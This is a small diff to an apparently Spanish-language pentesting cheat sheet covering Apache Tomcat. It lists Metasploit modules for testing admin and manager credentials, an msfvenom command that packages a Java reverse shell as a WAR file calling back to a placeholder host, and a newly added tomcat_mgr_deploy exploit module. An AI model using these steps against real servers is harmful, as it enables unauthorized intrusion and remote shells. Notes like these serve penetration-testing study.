@@ -65,7 +65,7 @@ Host: foo.bar
 use auxiliary/admin/http/tomcat_administration // Probar creds de admin
 use auxiliary/scanner/http/tomcat_mgr_login // Login de manager
 	En caso de que accedamos al manager => msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
-
+	O también => use exploit/multi/http/tomcat_mgr_deploy
 
 #DNS
 nslookup
